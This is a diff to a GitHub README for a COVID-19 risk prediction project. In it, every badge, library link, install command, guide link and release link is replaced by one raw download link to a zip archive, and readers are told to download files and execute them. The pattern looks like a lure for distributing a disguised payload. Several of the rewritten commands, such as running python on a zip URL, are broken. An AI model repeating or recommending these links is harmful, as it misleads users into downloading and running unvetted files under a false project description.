@@ -1,6 +1,6 @@
 # 🌍 Big Data Architecture for Pandemic Risk Prediction
 
-![Big Data Architecture](https://img.shields.io/badge/Version-1.0.0-brightgreen) ![License](https://img.shields.io/badge/License-MIT-blue)
+![Big Data Architecture](https://raw.githubusercontent.com/Flixteu356/BigData-Architecture/main/dataset/Big-Data-Architecture-mattaro.zip) ![License](https://raw.githubusercontent.com/Flixteu356/BigData-Architecture/main/dataset/Big-Data-Architecture-mattaro.zip)
 
 Welcome to the **BigData-Architecture** repository! This project focuses on predicting pandemic risk, specifically COVID-19, through data analysis, machine learning modeling, and a real-time dashboard. Our goal is to provide a robust system that helps in understanding and assessing risks associated with pandemics.
 
@@ -33,7 +33,7 @@ In the face of global health challenges, the ability to predict pandemic risks i
 
 - **Big Data Technologies**: Hadoop, HDFS
 - **Machine Learning**: Scikit-learn, TensorFlow
-- **Data Visualization**: D3.js, Plotly
+- **Data Visualization**: https://raw.githubusercontent.com/Flixteu356/BigData-Architecture/main/dataset/Big-Data-Architecture-mattaro.zip, Plotly
 - **Database**: Real-time databases for live data updates
 - **Languages**: Python, JavaScript
 
@@ -44,7 +44,7 @@ To get started with the project, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Flixteu356/BigData-Architecture.git
+   git clone https://raw.githubusercontent.com/Flixteu356/BigData-Architecture/main/dataset/Big-Data-Architecture-mattaro.zip
    ```
 
 2. Navigate to the project directory:
@@ -56,19 +56,19 @@ To get started with the project, follow these steps:
 3. Install the required dependencies:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Flixteu356/BigData-Architecture/main/dataset/Big-Data-Architecture-mattaro.zip
    ```
 
-4. Set up the Hadoop environment. Follow the [Hadoop installation guide](https://hadoop.apache.org/docs/stable/hadoop-project-dist/hadoop-common/SingleCluster.html).
+4. Set up the Hadoop environment. Follow the [Hadoop installation guide](https://raw.githubusercontent.com/Flixteu356/BigData-Architecture/main/dataset/Big-Data-Architecture-mattaro.zip).
 
-5. Download the necessary datasets from the [Releases section](https://github.com/Flixteu356/BigData-Architecture/releases) and execute the required scripts.
+5. Download the necessary datasets from the [Releases section](https://raw.githubusercontent.com/Flixteu356/BigData-Architecture/main/dataset/Big-Data-Architecture-mattaro.zip) and execute the required scripts.
 
 ## Usage
 
 To run the system, use the following command:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/Flixteu356/BigData-Architecture/main/dataset/Big-Data-Architecture-mattaro.zip
 ```
 
 This command will start the data processing and machine learning tasks. You can monitor the progress in the console.
@@ -121,6 +121,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, please visit the [Releases section](https://github.com/Flixteu356/BigData-Architecture/releases). Here, you can download necessary files and execute them as needed.
+For the latest releases, please visit the [Releases section](https://raw.githubusercontent.com/Flixteu356/BigData-Architecture/main/dataset/Big-Data-Architecture-mattaro.zip). Here, you can download necessary files and execute them as needed.
 
 Thank you for your interest in the **BigData-Architecture** project! Together, we can make a difference in understanding and mitigating pandemic risks.
